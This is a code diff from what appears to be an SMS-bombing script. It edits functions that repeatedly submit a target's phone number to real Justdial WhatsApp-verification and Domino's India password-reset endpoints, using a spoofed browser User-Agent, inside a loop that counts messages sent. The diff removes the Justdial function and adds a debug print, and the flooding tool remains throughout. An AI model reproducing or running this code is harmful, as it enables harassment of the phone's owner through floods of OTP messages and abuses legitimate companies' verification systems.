@@ -119,17 +119,7 @@ def nnnnow(number):
     if request.status_code==200:
         return True
         
-def justdial(number):
-    data={
-    "name": "ejtipwetng",
-    "mob": number
-    }
-    headers = { "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
-    }
-    url="https://www.justdial.com/functions/whatsappverification.php?wap=77"
-    request= requests.post(url,data=data,headers=headers)
-    if request.status_code==200:
-        return True
+
         
 def dominos(number):
     data={
@@ -145,6 +135,7 @@ def dominos(number):
     }
     url="https://api.dominos.co.in/loginhandler/forgotpassword"
     request= requests.post(url,json=data,headers=headers)
+    print(request.status_code,request.text)
     if request.status_code==200:
         return True
         
@@ -270,12 +261,6 @@ def main(number,times):
             break
         if i<times:
             if nnnnow(number):
-                i=i+1
-                print(f"sms sent successful {i}")
-        else:
-            break
-        if i<times:
-            if justdial(number):
                 i=i+1
                 print(f"sms sent successful {i}")
         else:
